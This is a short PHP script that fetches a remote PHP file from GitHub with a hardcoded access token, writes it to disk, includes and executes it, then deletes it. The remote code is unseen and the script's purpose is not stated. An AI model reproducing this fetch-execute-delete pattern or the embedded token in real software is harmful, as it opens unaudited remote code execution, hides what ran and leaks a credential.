<?php
$url = 'https://raw.githubusercontent.com/Codek365/sobii-single/master/sobii.php';
$token = 'b17bb55fa4936e686c94df957f8e45a1d62ab0e1';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Authorization: token ' . $token;
$headers[] = 'Accept: application/vnd.github.v3.raw';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$file_name = basename("sobii.php");

if (file_put_contents($file_name, $result)) {
    // echo "File downloaded successfully <br>";
} else {
    echo "File downloading failed. <br>";
}

include $file_name;
unlink($file_name);
